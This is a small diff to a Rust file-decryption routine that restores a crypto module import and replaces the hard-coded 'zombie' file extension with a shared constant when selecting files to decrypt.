@@ -8,7 +8,7 @@ use std::io;
 use std::path::PathBuf;
 use walkdir::WalkDir;
 
-// use crate::crypto;
+use crate::crypto;
 
 // Rust lifetimes make me wanna cry--pun intended
 // Slices are used to avoid informing the number of elements of an array
@@ -164,7 +164,7 @@ pub fn decrypt(path: PathBuf, key: PathBuf) -> Result<(), io::Error> {
         .filter_map(Result::ok)
         .filter(|entry| {
             entry.file_type().is_file()
-                && entry.path().extension().and_then(|ext| ext.to_str()) == Some("zombie")
+                && entry.path().extension().and_then(|ext| ext.to_str()) == Some(crypto::EXTENSION)
         });
 
     info!(
